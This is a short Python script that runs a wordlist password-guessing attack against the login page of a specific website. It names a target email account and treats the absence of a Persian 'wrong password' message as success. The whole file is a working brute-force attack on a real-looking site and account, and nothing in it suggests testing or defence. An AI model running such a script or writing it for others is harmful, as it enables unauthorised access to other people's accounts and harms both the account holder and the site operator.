import requests

url = "https://rrlco.ir/users/login"
username = "fdmxfarhan@yahoo.com"
wordlist_file = "passwords.txt"

def try_login(password):
    data = {
        "username": username,
        "password": password.strip()
    }
    
    response = requests.post(url, data=data)
    # print(response.text)

    if "رمز عبور اشتباه میباشد!" not in response.text:
        print(f"[+] SUCCESS! Password found: {password}")
        return True
    else:
        print(f"[-] Tried: {password.strip()}")
        return False

with open(wordlist_file, "r") as passwords:
    for password in passwords:
        if try_login(password):
            break


